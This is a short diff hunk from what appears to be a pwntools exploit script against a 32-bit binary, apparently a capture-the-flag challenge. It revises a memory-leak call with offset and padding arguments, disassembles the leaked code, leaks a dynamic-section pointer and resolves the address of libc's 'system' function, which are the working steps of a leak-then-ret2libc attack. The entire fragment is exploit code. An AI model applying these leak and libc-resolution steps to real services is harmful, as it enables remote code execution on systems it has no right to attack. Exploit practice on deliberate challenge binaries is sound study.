@@ -11,7 +11,7 @@ saveSocket = p
 
 base_addr = 0x08048000
 
-data = leak_code(p,0x0804852b,0x100)
+data = leak_code(r,263,2,0x0804852b,10) # leak_code(r,offset,pad,start_addr,size)
 print disasm(data,arch='i386')
 d, dynamic_ptr = leak_libc_ptr(p,base_addr)
 system_libc  = leak_libc(d,'system')
